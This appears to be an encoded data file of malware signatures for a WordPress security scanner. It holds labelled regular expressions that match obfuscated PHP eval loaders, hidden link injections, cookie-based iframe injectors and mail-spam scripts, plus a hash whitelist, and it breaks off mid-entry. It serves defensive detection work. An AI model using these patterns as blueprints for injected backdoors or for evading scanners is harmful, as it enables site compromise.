qXChbXlx7XStcJEdMT=JBTFNbXHtcW11bJyJdXFx4W15ce1=rW1x7XHNdK1wkW2EtelxfMC=5XSsoXFtbXlxdXStbXF1cc1x9XSspKj1bXjtdK1wkX1NFUlZFUltce1xbXVsnIl1cXHhbXjtdK1s7XHNdK2lmXHMqXChbXlx7XStcJEdMT=JBTFNbXHtcW11bJyJdXFx4W147XStbXHNcfTtdKigkfFw_PikvaSI7fXM6NTM6ImlmIEhUVFBfVVNFUl9BR=VOVCBhZGRfYWN=aW9uIHdwX2Zvb3RlciBmdW5jdGlvbiBlY2hvIjthOjI6e2k6MDtzOjU6IkYxOEZCIjtpOjE7czoyMTU6Ii8oXCRbYS16XF8wLTldKyhcW1teXF1dK1tcXV=rKSpccyo9XHMqZ2V=X29wdGlvblwoW147XStbO1xzXStpZlxzKlwoW15ce1=rSFRUUF9VU=VSX=FHRU5UW15ce1=rW1x7XHNdK2FkZF9hY3Rpb25cKFsnIlxzXSt3cF9mb29=ZXJbJyJccyxdKyhbYS16XF8wLTldKylbJyJcc1=rW147XStbO1xzXH1dKykrZnVuY3Rpb25ccytcM1teXHtdK1tce1xzXSsoW15cfV=rXHMqKStcfS9pIjt9czozMDoiZGl2IGRpc3BsYXkgbm9uZSBocmVmIGh=dHAgYnV5IjthOjI6e2k6MDtzOjU6IkYzSDBWIjtpOjE7czoxMjY6Ii88KChkaXYpfChhKSlccytbXj5dKyhkaXNwbGF5W1xzXDpdK25vbmVbXj5dK3woPlxzKjwoYSlccytbXj5dKik_aHJlZls9JyJdK2h=dHBbXj5dKyl7Mn=-Lio_YnV5Lio_XHMqPFwvKFwzfFw2PlxzKjxcL1wyKT5ccyovaSI7fXM6ODU6IkNvcHlyaWdodCBmdW5jdGlvbiBzZXRDb29raWUgcmV=dXJuIGZ1bmN=aW9uIHVzZXJBZ2VudCBzZXRDb29raWUgd3JpdGUgaWZyYW1lIHRvcCBOZWciO2E6Mjp7aTowO3M6NToiSDM2SlYiO2k6MTtzOjQwNzoiLyg8KHNjcmlwdClbXj5dKj5ccyopPyhcL1wqXHMqQ29weXJpZ2h=LitccypcKlwvXHMqfFthLXpfMC=5XHNdKz1bXjtdKztccyp8c2V=VGltZW91dFwoW147XSs7XHMqKSooZnVuY3Rpb24gW3NnXWV=Q29va2llXCguKz8oKGRvY3VtZW5=XC5jb29raWU9fHJldHVybilbXlx9XStbO1x9XHNdKykrKSsuKz9bc2ddZXRDb29raWVcKC4rP2RvY3VtZW5=XC53cml=ZVwoWyInXTwoc2NyaXB=fGlmcmFtZSlbXj5dKyhzcmM9WyciXCtcc2h=cHNcOl=rXC9cL3x=b3A6XHMqXC=pKC4rP2RvY3VtZW5=XC5jb29raWUuKz9cLnRvVVRDU3RyaW5nW1woXClcfV=rfC4rP2VuY29kZVVSSUNvbXBvbmVudFwoZG9jdW1lbnRcLnJlZmVycmVyXCkuKz8oWyciXSlcL3NjcmlwdD5cMTApP1teO1=rW1wpO1x9XHNdKyg8XC9cMj58JCkvaXMiO31zOjE1OiJwaHAgTG9=cyBvZiBIZXgiO2E6Mjp7aTowO3M6NToiSDMxQVQiO2k6MTtzOjI5NzoiL14oPFw_W3BoXHNdKyhmdW5jdGlvbiBiYXNlNjRbXlx7XStce1xzKnJldHVybiBiYXNlNjRbXlx9XStcfVxzKmlmW1xzXChdK2lzc2V=W1xzXChdK1wkXyhSRVFVRVN8R=V8UE9TKVQuKzxib2R5IG9ubG9hZD1bXHMnIlxcXStsb2NhdGlvbltePl=rW148XSs8XC9ib2R5PlxzKjxcL2h=bWw-XHMqPFw_W3BoXHNcfV=rfCguKz9cXHhbMC=5QS1GXXsyfSl7NTIsfSg_PS4qXCkpW15cbl=rKVxzKigkfFw_Pil8XFx4RUZcXHhCQlxceEJGXHMqPFwhRE9DVFlQRS4rP2V2YWxcKC4rPFwvYm9keT5ccyo8XC9odG1sPlxzKiQpL2lzIjt9czo2MToic2NyaXB=IGRvY3VtZW5=IHdyaXRlIGRpdiBhbmNob3Igc2NyaXB=IGRvY3VtZW5=IHdyaXRlIEVORGRpdiI7YToyOntpOjA7czo1OiJHQlI4SyI7aToxO3M6MTg2OiIvPHNjcmlwdFtePl=qPlxzKmRvY3VtZW5=XC53cml=ZVwoWyInXShbXDxkaXZdWyInIFwrXSopezR9W14-XSo-WyInXVwpO1xzKjxcL3NjcmlwdD5ccyooPGEgLis_PFwvYT5ccyopKzxzY3JpcHRbXj5dKj5ccypkb2N1bWVudFwud3JpdGVcKFsiJ1=oW1w8XC9kaXZdWyInIFwrXSopezV9PlsiJ11cKTtccyo8XC9zY3JpcHQ-L2kiO31zOjQzOiJlY2hvIGRpdiBwb3NpdGlvbiBhYnNvbHV=ZSBuZWdhdGl2ZSBhbmNob3JzIjthOjI6e2k6MDtzOjU6IkgxNTlZIjtpOjE7czozNzE6Ii8oPzwhWyciXSk8KGh=bWw-KT9bXHM8XSooKChzY3JpcHQpW14-XSo-XHMqZG9jdW1lbnRcLndyaXRlW1woXHMnIl=rPCk_ZGl2fChzdHlsZSlbXj5dKj5ccypbXC5cI1=oW2Etel9cLTAtOV=rKVtcc1x7XSspKFteXH1cPl=qKGxlZnR8cG9zaXRpb258dG9wfG9wYWNpdHl8ZmlsdGVyfGRpc3BsYXl8dGV4dC1pbmRlbnQpXDpccyooYWxwaGFcKG9wYWNpdHk9MHwwP1wufFwtWzAtOVwuXXszLH18bm9uZXxhYnNvbHV=ZSkpezMsfVtePl=qPlsnIlwpO1xzXSooPFwvXDU-KT8uKj88KCgoW2Itc11bYS16MC=5XSopW14-XSo-Wy5cc1=qPCkqYSAuKz88XC9hKD5bXjxdKjwoXC8oW15kXVthLXowLTldKnxcMTQpKT8pKikrPihccyo8XC8oXDJ8ZGl2PikpKi9pIjt9czo=MToiUEhQIEdhcmJhZ2UgQXJvdW5kIGV2YWwgVmFyaWFibGUgRnVuY3Rpb24iO2E6Mjp7aTowO3M6NToiRjJDSmQiO2k6MTtzOjE1MToiLzxcP1twaFxzXStcJFthLXpcXzAtOV=rXHMqPShccyonLisnW1wpXC5dKykrKFxzKicuK2V2YWxccypcKFwkW1wkXHtdKlthLXpcXzAtOV=rW1x9IFx=XSooXFtbXlxdXStcXVsgXHRdKikqXCguKydbXClcLl=rKShccyonLisnW1wuO1wpXSspK1xzKihcPz58JCkvaSI7fXM6NzY6InN=cmlwc2xhc2hlcyBSRVFVRVNUIGlmIGVjaG8gcmV=dXJuIGZvcGVuIGZ3cml=ZSBmY2xvc2UgZWNobyBmdW5jdGlvbiByZXR1cm4iO2E6Mjp7aTowO3M6NToiRjJFNmQiO2k6MTtzOjMxMjoiLyhceEVGXHhCQlx4QkYpPzxcP1twaFxzXSsoXCRbYS16XF8wLTldK1xzKj1ccyooc3RyaXBzbGFzaGVzW1woXHNdKyk_XCRfKFJFUVVFU3xHRXxQT1MpVFxbWyInXVteO1=qWztcc1=rKSsoaWZbXChcc1=rXCRbXlx7XSpbXHtcc1=rZWNob1xzKlsiJ11bXjtdK1s7XHNdK3JldHVyblteO1=qO1tcc1x9XSspKy4rP2ZvcGVuXCguKz9md3JpdGVcKC4rP2ZjbG9zZVwoW147XSpbO1xzXStlY2hvXHMqWyInXVteO1=rWztcc1=rKGZ1bmN=aW9uLis_W3Jta117Mn1kaXJcKFteO1=rO1tcc1x9XSsocmV=dXJuW147XSo7W1xzXH1dKykqKSsoJHxcPz4pL2lzIjt9czoyNToiVmFyIEhleCBWYXJpYWJsZSBGdW5jdGlvbiI7YToyOntpOjA7czo1OiJHQ1NBZyI7aToxO3M6MTkyOiIvKCgoXCRbYS16XzAtOVxzXC5dKz1bXjtdKztccyopKlwkW2Etel8wLTlcc1wuXSs9KFteO1=qXFxbeDAtOWEtZl17MiwzfSkrW147XSo7XHMqKSspKyhpZlxzKlwoW15ce1=rXHtccyopPygoXCRbYS16XzAtOV=rXHMqPVxzKik_XEA_XCRbYS16XzAtOV=rKFxzKlxbW15cXV=rXF=pKlwoW147XSs7XHMqKStbXH1cc1=qKFwvXC8uKyk_L2kiO31zOjg5OiJpbmlfc2V=IGlmIGlzc2V=IGFycmF5IGJhc2U2NF9kZWNvZGUgZnVuY3Rpb24gcmV=dXJuIGJhc2U2NF9kZWNvZGUgZXZhbCBWYXJpYWJsZSBGdW5jdGlvbiI7YToyOntpOjA7czo1OiJHNFJMUSI7aToxO3M6MzUwOiIvPFw_W3BoXHNdKyhbaWZcc1woXCFcQF=qKGluaV9zZXRccypcKHxlcnJvcl9yZXBvcnRpbmdccypcKHxzZXRfdGltZV9saW1pdFxzKlwofGlzc2V=XHMqXCh8ZGVmaW5lfGdsb2JhbHxcJFtce1wkYS16XzAtOVx9XFtcXCciXF1cc1=rPSlbXjtdKztbXH1cc1=qKSsoZnVuY3Rpb25ccyooW2Etel8wLTldKylccypcKC4rPyhyZXR1cm5ccyooXDR8YmFzZTY=X2RlY29kZSl8XCRbYS16XzAtOV=rXHMqKFxbW15cXV=qXF1ccyopKilcKC4rPykrKD88IVwvXC8sZnVuY3Rpb25cKHJlc3BvbnNlXCkgXHsgKWV2YWxcKC4rP1wpKztbXHNcfTtdKyhcPz5ccyooXCNcIVtcL2Etel9cLTAtOVwrPVxzXXsyMDAsfSQpP3wkKS9pcyI7fXM6NDY6ImNsYXNzIGNvbnN=IHBhY2sgSCogZnVuY3Rpb24gaW5jbHVkZSBuZXcgQ2xhc3MiO2E6Mjp7aTowO3M6NToiRjVROUciO2k6MTtzOjE5MjoiL2NsYXNzXHMrKFthLXpfMC=5XSspXHMqXHsuKz9jb25zdFxzKyhbYS16XzAtOV=rKVxzKj=uKz9zZWxmXDpcOihbYS16XzAtOV=rKVwocGFja1woJ=hcKidbLFxzXStzZWxmXDpcOlwyXCkrLis_ZnVuY3Rpb25ccytcM1woKFwkW2Etel8wLTldKykuKz9cQD8oaW5jbHVkZXxyZXF1aXJlKShfb25jZSk_W147XStcNC4rbmV3XHMrXDE7L2lzIjt9czoxNDoiZXZhbCBzdHJfcm9=MTMiO2E6Mjp7aTowO3M6NToiRjlQQ2wiO2k6MTtzOjE1OToiLyhcL1wvLispP1xzKigoaW5pX3NldFwofGVycm9yX3JlcG9ydGluZ1wofFwkW2Etel8wLTldK1tcc1wuXSo9KVteO1=qO1xzKikqXEA_KGV2YWx8YXNzZXJ=fFwkW2EtelxfMC=5XSsoXHMqXFtbXlxdXStcXSkqKVxzKlwoXHMqc3RyX3JvdDEzXCgnLionXClcKTsoXHMqXDEpPy9pIjt9czozMjoicGhwIEdMT=JBTFMgSGV4IGZ1bmN=aW9uIGlmIGV2YWwiO2E6Mjp7aTowO3M6NToiRzZHQWoiO2k6MTtzOjYwMjoiLzxcP1twaFxzXSooXHMqXCQoR=xPQkFMU3xbXHtcJCciXStbMC=5X1wtYS16XFwnIlwuXStbXH1cc1=rKVtcc1xbXHsnIl=rKFthLXpfMC=5XSspWyInXH1cXVxzXSsoW147XSo7XHMqZ2xvYmFsXHMqXCRcM1teO1=qO1xzKlwkXDNccyo9XHMqXCRHTE9CQUxTW147XSo7XHMqXCQoXDN8XHtbXlx9XSpcfSspXHMqKFxbW15cXV=rW1xdXHNdK3xce1teXH1dK1tcfVxzXSspKyk_PVxzKlsnIl=oXFx4WzAtOWEtZl17MSwyfSkrWyInXTtccyooKGVjaG98cHJpbnQpP1tcc1xAXSpcJChHTE9CQUx8XDMpW147XSs7XHMqfFwkW2Etel8wLTldK1xzKihbXC49XStccypcQD8oTlVMTHwoYXJyYXlbXChcc1=rKT9cJChHTE9CQUx8XDMpW147XSp8XCRbYS16XzAtOV=rKFxbW15cXV=rW1xdXHNdK3xce1teXH1dK1tcfVxzXSspKnxbIiddKykpKztccyp8Z2xvYmFsXHMqXCRbXjtdKztccyp8ZnVuY3Rpb25ccytbMC=5X2Etel=rXHMqXChbXlx7XSt8XHtccyp8XH1ccyp8KGZvcihlYWNoKT98KGVsc2VccyopP2lmKVxzKlwoLis_XCkrXHMqfHJldHVyblteO1=qO1tcc1x9XSspezMwLH=pK2V2YWxcKC4rP1wpKztbXHNcfV=rKGV4aXRbXjtdKjtbXHNcfV=rKT8oJHxcPz4pL2kiO31zOjM2OiJwaHAgaWYgaXNzZXQgUE9TVCBiYXNlNjRfZGVjb2RlIG1haWwiO2E6Mjp7aTowO3M6NToiR=NVS2=iO2k6MTtzOjQ2ODoiLzxcP1twaFxzXSooKFwkKFswLTlfYS16XSspXHMqPVxzKmV4cGxvZGVbXixdKyxccypiYXNlNjRfZGVjb2RlXChbXjtdKztccyp8KChpZnxpc3NldHxmb3JlYWNoKVxzKlwoKStcJF8oUkVRVUVTfEdFfFBPUylUW15cKV=rW1wpXHNce1=rKT8oXCRbMC=5X2Etel=rW1xzXC5dKj1ccypbYS16XzAtOVxzXChdKlwkKFwzfF9SRVFVRVNUfF9HRVR8X1BPU1QpKFteO1=qW1wpO1x9XHNdK2Vsc2VbXHtcc1=qfGVjaG98cHJpbnQpKlteO1=qWztcc1=rKFxzKmV4aXQ7KT98XC9cLy4rXHMqKVtcfVxzXSopKyhcJFswLTlfYS16XStbXHNcLl=qPVxzKiIuKz9cXHJcXG4iO1xzKikqKChcJFthLXpfMC=5XStccyo9XHMqfGlmW1xzXChdK3xlbHNlW15ce1=qW1x7XHNdKykqbWFpbFxzKlwoW147XStbXCk7XHNcfV=qKChpZltcKFxzXSt8ZWxzZSlbXlx7XSpbXHtcc1=rZWNob1teO1=qWztcc1x9XSt8ZXhpdDtccyopKikrKCR8XD8-KS9pIjt9czozMDoid3BfZW5xdWV1ZV9zY3JpcHQgU1dFRVRDQVBUQ=hBIjthOjI6e2k6MDtzOjU6IkY2VUdsIjtpOjE7czo2MDoiL3dwX2VucXVldWVfc2NyaXB=XChbXixdKyxccypbJyJdaHR=cC4rP1NXRUVUQ=FQVENIQVteO1=rOy9pIjt9czozODoicGhwIGNsYXNzIFZhcmlhYmxlIEZ1bmN=aW9ucyBuZXcgQ=xBU1MiO2E6Mjp7aTowO3M6NToiRzlSQkUiO2k6MTtzOjMyMDoiLzxcP1twaFxzXSsoXC9cKi4qP1wqXC9ccyp8ZXJyb3JfcmVwb3J=aW5nXCgwXCk7XHMqfGZ1bmN=aW9uW15cKF=rZG9sbHlbXlx7XStcey4qPyhyZXR1cm58ZGJEZWx=YSlbXjtdKls7XH1cc1=qKSpjbGFzc1xzKyhbYS16XzAtOV=rKVxzKlx7Lis_KChcJFthLXpfMC=5XHsnIlx9XSsoXHMqXFtbXlxdXStcXSkqXHMqPVxzKik_KFwkW2Etel8wLTlce1x9XSsoXHMqXFtbXlxdXStcXSkqfGJhc2U2NF9kZWNvZGVcKHJhd3VybGRlY29kZXxmaWxlX3B1dF9jb25=ZW5=cylccypcKC4qP1tcKVxzXSs7XHMqKXszLH=uKz9uZXdccytcM1teO1=qO1xzKigkfFw_PikvaXMiO31zOjE=OiJ2aXNpdG9yVHJhY2tlciI7YToyOntpOjA7czo1OiJGOU1IbSI7aToxO3M6MTc3OiIvKCg8XCEtLXxcL1wqKXZpc2l=b3JUcmFja2VyKFwqXC98LS=-KSlccyooPFw_W3BoXHNdKy4rP2Jhc2U2NF9kZWNvZGVccypcKC4rP1w_PnwuKz9kb2N1bWVudFwuY3JlYXRlRWxlbWVudFwoWyciXXNjcmlwdFsiJ11cKTtccypbYS16XzAtOV=rXC5zcmNccyo9W1xzJyJdK2h=dHBcOlwvXC8uKz8pXHMqXDEvaXMiO31zOjU4OiJmc29ja29wZW4gZndyaXRlIHdoaWxlIGZlb2YgZmNsb3NlIHByZWdfbWF=Y2ggZ3p1bmNvbXByZXNzIjthOjI6e2k6MDtzOjU6IkZBNUxPIjtpOjE7czoyMzI6Ii8oXCRbYS16XzAtOV=rKVxzKj1ccypcQD9mc29ja29wZW5cKFteO1=rO1xzKmlmW1woXHNdK1wxW1wpXHNdKlx7Lis_ZndyaXRlXChcMVteO1=rO1xzKndoaWxlW1xzXChcIV=rZmVvZlwoXDEuKz9mY2xvc2VcKFwxXCk7XHMqcHJlZ19tYXRjaFwoW14sXSssW14sXSssXHMqKFwkW2Etel8wLTldKylcKTtccyppZltcKFxzXStcMlxbMVxdW1xzXCFdKj=uKz9nenVuY29tcHJlc3NcKFteO1=rO1tcfVxzXSsvaXMiO31zOjIwOiJUYWdnZWQgZXZhbCBmdW5jdGlvbiI7YToyOntpOjA7czo1OiJHM1Q5QSI7aToxO3M6MTI1OiIvKFwvXCpbXlwqXStcKlwvKVxzKihbXHNhLXpfMC=5XD1dKykqWztcc1woXSood2luZG93W1wuXFsiJ1=rXFx4W147XSt8ZnVuY3Rpb25cKFwpLispO1xzKmV2YWxbXChcc1=rW15cKV=rWyciXHNcKFwpO1x9XStcMS9pcyI7fXM6NDQ6InNjcmlwdCB2YXIgaHR=cCBpZiBkb2N1bWVudCB3cml=ZSBzY3JpcHQgc3JjIjthOjI6e2k6MDtzOjU6IkcyQ=l3IjtpOjE7czozNTI6Ii8oPHNjcmlwdFtePl=qPlxzKigodmFyXHMqKT9bYS16XzAtOV=rXHMqPVsnIjtcc1=qKHNldFRpbWVvdXR8ZW5jb2RlVVJJQ29tcG9uZW5=KVwoW15cKV=qWyciXCk7XHNdezIsfSkrKFt2YXJcc1=qKFthLXpfMC=5XSspXHMqPVxzKlsnIl1baGZ=XSt=cFtzXSo6XC9cL1teO1=rO1xzKigodmFyXHMqKT8oW2Etel8wLTldKylccyo9XHMqXDZbXjtdKztccyopKyk_aWZbXlx7XStce1xzKmRvY3VtZW5=XC53cml=ZVwoWyInXTxbc2NyaXB=XHMnIlwrXXs3LH1bXlx9XSpzcmM9WyciXHNcK1=rKFw5fFtmaHRdK3RwW3NdKjpcL1wvLitqcXVlcnlcLihtaW5cLikqcGhwKShbXjtdK1tcfTtcc1=rKSs_PFwvc2NyaXB=PikrL2kiO31zOjQ1OiJmdW5jdGlvbiB1bnNldCB3cF9saXN=X3RhYmxlIGl=ZW1zIGFkZF9hY3Rpb24iO2E6Mjp7aTowO3M6NToiR=FHRUciO2k6MTtzOjQ=MzoiLyhcL1wqW15cKl=qKFwqW15cKlwvXSopK1wvXHMqKSooXCRbXjtdKz1bXjtdKztccyopKihpZltcKFxzXCFdK2Z1bmN=aW9uX2V4aXN=c1tcKFxzJyJdK2luaV9zZXRbJyJcKVx7XHNdKyhcQD9pbmlfc2V=XChbXjtdK1s7XHNdKykrW1xzXH=7XSspKmZ1bmN=aW9uXHMrKFthLXpfMC=5XSspXHMqXChbXlx9XSsocGFja1woWyciXUhcKlsnIixcc1wuMC=5QS1GXCldKztccyppZltcc1woXEBpc19dK2ZpbGVbX2Etel=qW1woXHNdKyhcJFthLXpfMC=5XSspLis_ZmlsZV9nZXRfY29udGVudHNbXHNcKF=rXDguKz9maWxlX3B1dF9jb25=ZW5=c1tcc1woXStcOHx1bnNldFwoXCR3cF9saXN=X3RhYmxlLT5pdGVtc1xbfGZpbGVfZ2V=X2NvbnRlbnRzXChfX=ZJTEVfXy4rP2ZwdXRzXCguKz9zY2FuZGlyXCgpLis_YWRkX2FjdGlvblwoW14sXStbLFxzMC=5XCknIl=rXDZbXjtdKzsvaXMiO31zOjM5OiJwaHAgZXJyb3JfcmVwb3J=aW5nIGZ1bmN=aW9uIGRldGVjdF9jbXMiO2E6Mjp7aTowO3M6NToiRkJCRzAiO2k6MTtzOjE2MDoiLzxcP1twaFxzXSsoXEA_KGVycm9yX3JlcG9ydGluZ3xzZXRfdGltZV9saW1pdHxpbmlfc2V=KVwoLio_MFwpO1xzKikrLio_ZnVuY3Rpb24gKGRldGVjdF9jbXNcKCkuK1wzW147XSs7XHMqKChpZlxzKlwoW15cKV=rfGVsc2UpW15ce1=qW15cfV=rW1x9XHNdKykrKCR8XD8-KS9pcyI7fXM6NTE6ImZ1bmN=aW9uIGdsdWVzX2l=IHNhbml=aXplX2tleSBjYWxsX3VzZXJfZnVuY19hcnJheSI7YToyOntpOjA7czo1OiJGQkk5SyI7aToxO3M6MjkyOiIvKGlmW1xzXChcIV=rZnVuY3Rpb25fZXhpc3RzXChccypbJyJdW2Etel8wLTldK1snIl1bXHNcKV=rXHtccyopP2Z1bmN=aW9uXHMrKFthLXpfMC=5XSspXHMqXChbXlwpXStbXClcc1=rXHtccyooXCRbYS16XzAtOV=rKVxzKj1ccypzYW5pdGl6ZV9rZXlcKFteO1=rO1xzKihcJFthLXpfMC=5XSspXHMqPVxzKmNhbGxfdXNlcl9mdW5jX2FycmF5XChccypcM1teO1=rO1xzKnJldHVyblxzKlw=LitcMlxzKlwoW147XSs7XHMqLitjYWxsX3VzZXJfZnVuY19hcnJheVwoW147XSs7W1x9XHNdKygkfCg_PVw_PikpL2lzIjt9czoxNjoicGhwIGV2YWwgVmFyIEhleCI7YToyOntpOjA7czo1OiJGQktLUiI7aToxO3M6MTE1OiIvPFw_W3BoXHNdKyhAP2V2YWxccypcKFxzKikrKFsnIl=pW1xzXFxdKlwkW2EtelxfMC=5XFtcXVx7XH1ccyciXSs9W1xzXFwnIl=qKFxceFswLTldezJ9KSsuK1wyKFxzKlwpKSs7XHMqKCR8XD8-KS9pIjt9czoyOToiaWYgc3RycG9zIFJFUVVFU1RfVVJJIGluY2x1ZGUiO2E6Mjp7aTowO3M6NToiRkNRRlMiO2k6MTtzOjE=OToiL2lmKFtcc1woXStzdHJbYS16XzAtOV=rKXsyLH1bXHNcKF=rXCRfU=VSVkVSXFtbIiddUkVRVUVTVF9VUklbJyJdXF1ccypcKStbXlwpXStbXClcc1=rXHtbXHNcQF=qKGluY2x1ZGV8cmVxdWlyZSkoX29uY2UpP1teO1=rWztcc1=rKGV4aXRbXHM7XSspP1x9L2kiO31zOjc2OiJlcnJvcl9yZXBvcnRpbmcgaW5pX3NldCBzZXRfdGltZV9saW1pdCBpZ25vcmVfdXNlcl9hYm9ydCBlbHNlaWYgcmVxdWlyZV9vbmNlIjthOjI6e2k6MDtzOjU6IkZDVUxkIjtpOjE7czoyMTk6Ii88XD9bcGhcc1=rKFwvXCpbXlwqXSooXCpbXlwqXC9dKikrXC9ccyp8XC9cL1teXG5dKlxzKykqKChlcnJvcl9yZXBvcnRpbmd8aW5pX3NldHxzZXRfdGltZV9saW1pdHxpZ25vcmVfdXNlcl9hYm9ydClccypcKFteO1=rWztcc1=rKXs1LH=oKGVsc2Vccyp8aWZccypcKCtbXlwpXStbXHNcKV=rKStcQD8ocmVxdWlyZXxpbmNsdWRlKShfb25jZSk_W147XStbO1xzXSspKygkfFw_PikvaSI7fXM6ODM6InBocCBpZiBmdW5jdGlvbl9leGlzdHMgZnVuY3Rpb24gY3VybF9pbml=IHJldHVybiBmdW5jdGlvbiB=cmltIHJldHVybiBiYXNlNjRfZGVjb2RlIjthOjI6e2k6MDtzOjU6IkcxOEZuIjtpOjE7czo=MDU6Ii88XD9bcGhcc1=rKFwkW2Etel8wLTldKylccyo9W147XSs7XHMqaWZccypcKFxzKlwhZnVuY3Rpb25fZXhpc3RzXChbIiddKFthLXpfMC=5XSspWyciXVwpW1wpXHNce1=qZnVuY3Rpb25ccypcMlwoW15cKV=rXClbXClcc1x7XStbXlxuXSpjdXJsX2luaXRcKFwpOy4rP3JldHVyblteO1=rO1tccytcfV=raWZccypcKFxzKlwhZnVuY3Rpb25fZXhpc3RzXChbIiddKFthLXpfMC=5XSspWyciXVwpW1wpXHNce1=qZnVuY3Rpb25ccypcM1woW15cKV=rXClbXClcc1x7XStbXlxuXSp=cmltW147XSs7Lio_cmV=dXJuW147XSs7W1xzK1x9XSsoLio_KGJhc2U2NF9kZWNvZGVbXChcc1=rXDF8XDJcKHxcM1woKVteXCldKltcKVxzXStbXjtdKls7XHNdKyl7Myx9KChlY2hvfHByaW5=KVteO1=rO1xzKikrKCR8XD8-KS9pcyI7fXM6MTI6IlBIUCByZXZlcnNlZCI7YToyOntpOjA7czo1OiJHMjhBciI7aToxO3M6NDE6Ii9eKFxzKlw-XD9ccyopPzsuK1wkKFtwaFxzXSpcP1w8XHMqKT8kL2lzIjt9fXM6ODoidGltdGh1bWIiO2E6MTp7czoyOToib3V=ZGF=ZWQgdmVyc2lvbnMgb2YgVGltVGh1bWIiO2E6Mjp7aTowO3M6NToiSDFRSkUiO2k6MTtzOjYwOiIvLitUaW1UaHVtYi4rZGVmaW5lXHMqXChbXHMnIl=rVkVSU=lPTltccyciXSssW1xzJyJdKzFcLi4rL3MiO319czo5OiJ3aGl=ZWxpc3QiO2E6Mjp7czozOiJwaHAiO2E6Mjg6e2k6MDtzOjU6IkZBOEhkIjtzOjM4OiI1ODczY2QxY2VhNjEwODIwMmQyMTM=N2YwMWYwNGRjZk84MTcyOCI7czo1OiJENzU5cCI7czozOToiMDEzNjM3MjhjODQzZmY5M2U5NmI2OTgzY2UzOGViYTZPMTk1NjE4IjtzOjU6IkQ1QTgzIjtzOjM4OiJkNWYzYzljYWZmMTRkNTdjODYwOGQ3OGRiMDA5NGJlME83MzY=MyI7czo1OiJENzVEOSI7czozODoiNTdhZjQ5ODE4YmJiOTQ5ZGMwYWM2Mzg2NzM4NjU1YmJPMjU4NTIiO3M6NToiRDdKRDkiO3M6Mzg6ImQ=OTQwNDI2MGQ3OWE=Y2MzNzU1YzAwZjU1ZGUyMDg5TzI1NjYyIjtzOjU6IkQ4VjhBIjtzOjM3OiI4NjYxZmUyYmZhNTk5NWY1NDZhMzMwNDdlOTAzODU2Y=8xMTM2IjtzOjU6IkRJQ=ZDIjtzOjM4OiI4MTI1ZDQyYzRiZTU=M2Y4NzRlYTVmNmExYjViZGU1NU8yNTg5NCI7czo1OiJESUNGRCI7czozOToiZWRkYjVmZGE3NGQ=MWRiZGFjMDE4MTY3NTM2ZDhkNTNPMjMxMzM4IjtzOjU6IkRJQ=ZFIjtzOjM4OiJjMTVhNGQ1YzM4MzQ=NGI5NWQyODU1OWY4MzQ4MTExZE8yMjU4OCI7czo1OiJFMVIydiI7czozODoiZTIwODM5YzU1OWE2NmM3Y2Y2Mjg2NTNiYTI=ODRlYWVPMjYzOTUiO3M6NToiRTFSMngiO3M6Mzg6ImYzMzgyZWMxNWMwMzBiZDMyZTI5M2ZhZjM=OTdlMjUzTzExMjI2IjtzOjU6IkUyMzBDIjtzOjM3OiIyOGE5MmY=NjQ5OGQzMmI5YTc=YzU4NDdmNzVjOTEyZU83Mzk5IjtzOjU6IkUyMzBDIjtzOjM3OiJmMDBhYWYwMWZmMDJkNTc1NmMyNjdiY2Y5MjBlNGMyOE8xNTQwIjtzOjU6IkUyQU1mIjtzOjM4OiI1N2M2NDdkOTNmYmQ=Nzg2OGI4N2I5MjFiZWU2M2FmOE8yNjM3NiI7czo1OiJFNUVEbyI7czozOToiOGUyYWY=ODg2ZGM4MWE1ZDkyODk4NjViYmI4MTNlZDFPMTk1NjE3IjtzOjU6IkU1SU5QIjtzOjM3OiJmODBkOWVmNGI3YmZkOWVmNTQyZDkwODdhMWRiMmFlOU8yMDEwIjtzOjU6IkU3RU12IjtzOjM4OiI1ZjkyN2YzYTk3MzIxOGQwN2U=M2VhMWM2OWZjMDMzMU8yNjc3NiI7czo1OiJFQTY2bCI7czozODoiYTViMWE3M2UwYzQyOTg5NTA3NTBhOGJjZDk2MjdlYWZPMjY4MTEiO3M6NToiRUNDRTAiO3M6Mzc6IjY=OTQ=ZTIyNTExM2JlMTgzOTRkNWJjMDFmYjNiNTM3Tzc1MzAiO3M6NToiRUNDRTMiO3M6Mzg6Ijk3ZTQzOGQ2YzljNjRhMjAyYjkzMDc4NmQyNzYyMDViTzYyNDU4IjtzOjU6IkVDQ=UzIjtzOjM4OiI2N2VjMWIxNTNjYzNmM2UzNmZiZWU1OTAyOWE5M2Q=YU8yNTkxNCI7czo1OiJFQ=pLRiI7czozNzoiODM2NjU3ZGJhNWNiMjI5MDAwMDI=NDc3NjYwZTlkZGZPODM2OSI7czo1OiJGNDM3MyI7czozODoiZjYwMDc5ZmVjMGU1ZDRkNjdlNDlhZGEzMzZkYWFmOTJPMjY4MTAiO3M6NToiRjQzNzQiO3M6Mzk6IjAzYjIxZmZjOWM3OWNmYjYyNDc5MGIwYmE=ODQ2OTFjTzMyMDMzMiI7czo1OiJGNUxNYiI7czozODoiNWU2ODU1Y2YwMmM=YWEwYWNjODcwMGY3ZjYxM2RmMDBPNjAxNjMiO3M6NToiRjZGSmUiO3M6Mzc6IjcxY2QxNjQ4MGFkZDIwZjUxNmY=MWNmMDQ1NzVmYjE4TzE4ODQiO3M6NToiRjlBOXQiO3M6Mzk6IjgzNGQyMmY4YjY4YTJjNWMwMTg2NmE=M2ViMjRlZmM=TzE5NTcwMiI7czo1OiJGQThIZCI7fXM6MjoianMiO2E6MzQ6e2k6MDtzOjU6IkY5QUFCIjtzOjM3OiI1NTRiYzc2YzcwMzUxMTg3ZjRjZTA1ZGRjMDEyYWFlZE8=Nzc2IjtzOjU6IkQ2NjdYIjtzOjM3OiI5YTljMTI1ODE=Yjk3MTU5ODJkMjQ2YTFlZTc4MDg=Zk81MzQ1IjtzOjU6IkQ2NjdYIjtzOjM4OiJlMzZhMDg2MTIzNzU2NDEyMjkzMjMxYWVhZDE3ZjI=Zk8zNzYyOSI7czo1OiJENzVBSCI7czozNzoiYTM4YWM1MjY2OTI=OTM4YTRmZjU1MTQzNjljNmI=MGRPNDY3NCI7czo1OiJENzVBSiI7czozNzoiMTA=M2ExZDdkODRlZTU2Zjg4MzFhNjBjZGZjNWRjMjhPNzA3NyI7czo1OiJENzVEUyI7czozODoiNmVjMTUwYjc5ODdjYWFlZjk4YjU5Yzg3YjlmNDcxYmVPMTE4NDIiO3M6NToiRTFSMm4iO3M6Mzg6IjYxNDdjY2VlN2FlZjlkYzBjNmViMTBkOGQ3YjMxMWY5TzcwODgzIjtzOjU6IkUxUjJ3I